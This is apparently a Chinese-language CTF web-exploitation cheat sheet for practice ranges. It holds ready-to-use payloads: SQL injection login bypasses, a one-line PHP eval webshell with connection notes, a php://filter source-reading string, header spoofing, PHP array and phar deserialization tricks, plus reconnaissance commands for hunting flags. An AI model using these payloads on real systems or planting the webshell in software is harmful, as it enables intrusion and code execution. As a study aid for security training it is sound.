# 一、现场操作必背卡

## ① HTTP 改头

```
Referer: https://xxx.com
User-Agent: MoeDedicatedBrowser
X-Forwarded-For: 127.0.0.1
```

```python
requests.get(url, headers={'Referer':'...', 'User-Agent':'...', 'X-Forwarded-For':'127.0.0.1'})
```

## ② PHP 数组绕过

```
?a[]=1              （md5/sha1/strcmp 收数组 → null）
?a[]=1&b[]=2
```
**⚠️ PHP 8 起数组失效，但靶场常 PHP 5/7。**

## ③ SQL 万能密码

```
admin' or '1'='1' --
' or 1=1 --+
admin" or "1"="1 --
```

## ④ 一句话木马 + 连接

```php
<?php @eval($_POST['x']); ?>
```
```
连接：URL = http://target/shell.php，密码 = x
本质 = 发 POST 带 x=命令
```

## ⑤ 读 PHP 源码

```
?f=php://filter/read=convert.base64-encode/resource=flag.php
```

## ⑥ SQL 判断四步

```
1. 数字/字符型：and 1=1 / and 1=2 反应不同 = 数字型
2. 找闭合符：输 ' 看报错是 '' 还是 ')
3. 数列数：order by n
4. 定位回显：union select 1,2,3
```

## ⑦ URL 特殊字符（**通用坑**）

| 字符 | 编码 | 说明 |
|---|---|---|
| **`+`** | **`%2B`** | ⚠️ **query 里 `+` = 空格**（base64 必须编码） |
| `&` | `%26` | 参数分隔 |
| `#` | `%23` | 锚点（会被截断） |
| 空格 | `%20` | |
| `"` | `%22` | |
| `{` `}` | `%7B` `%7D` | |
| `'` | `%27` | |

**最稳**：整体用 `urlencode()` / `EscapeDataString()`。

## ⑧ phar 反序列化

```
触发：任意【文件函数】+ phar:// 路径
生成：new Phar("x.phar") + setStub + setMetadata(new 类()) + addFromString
前提：phar.readonly = 0
流程：upload 写 phar（内容 base64） → check 用 phar:// 触发
```

# 二、魔术方法触发条件（**秒查**）

| 想触发 | 写什么代码 |
|---|---|
| `__construct` | `new Class()` |
| `__destruct` | **什么都不写**（脚本结束）/ `unset($obj)` |
| `__wakeup` | `unserialize($str)` |
| `__sleep` | `serialize($obj)` |
| `__toString` | `echo $obj` / `"x" . $obj` / `strlen($obj)` |
| `__call` | `$obj->不存在的方法()` |
| `__get` | `$obj->private属性` / `$obj->不存在属性` |
| `__set` | `$obj->不存在属性 = 1` |
| `__invoke` | `$obj()` |
| `__isset` | `isset($obj->不存在属性)` |
| `__unset` | `unset($obj->不存在属性)` |

# 三、PHP 语法速查

| 写法 | 含义 |
|---|---|
| `->` | 访问对象成员 |
| `::` | 访问静态/常量 |
| `$this` | 当前对象 |
| `$this->$name` | **可变属性**（属性名是变量） |
| `$f()` | **变量函数**（`$f` 里是函数名） |
| `$arr["x"]()` | 数组元素当函数调 |
| **`[$obj,"m"]()`** | **数组 callable** = `$obj->m()` |
| `&` | 引用（`$b = &$a`） |
| `@` | 抑制警告 |
| `.` | **字符串拼接** |
| `=>` | 数组键值 |
| `[]` | 数组/下标 |
| `global $x;` | 引入全局变量 |

# 四、序列化格式速查

| 记号 | 含义 |
|---|---|
| `O:长度:"类名":属性数:{...}` | 对象 |
| `s:长度:"字符串"` | 字符串 |
| **`S:长度:"...\00..."`** | 字符串（**可转义**） |
| `i:123` | 整数 |
| `b:1` | 布尔 |
| `N` | null |
| `a:个数:{...}` | 数组 |
| **`R:n`** | **引用（值）** |
| `r:n` | 引用（对象） |

**可见性**：
```
public      →  名字
protected   →  \0*\0名字
private     →  \0类名\0名字
```

# 五、Linux 命令速查

| 命令 | 作用 |
|---|---|
| `ls` | 列当前目录 |
| **`ls /`** | **列根目录**（flag 常在 `/flag`） |
| `ls ..` | 列上一级 |
| `ls ../` | 同上（末尾 `/` 无所谓） |
| `cat /flag` | 读文件 |
| `find / -name "*flag*"` | 找 flag |
| `whoami` | 当前用户 |
| `uname -a` | 系统信息 |
| `` `cmd` `` | 反引号执行命令 |

**⚠️ `ls..`（无空格）是无效命令**（会报 `command not found`）。

**Windows 对应**：`dir`（≈ls）、`type`（≈cat）
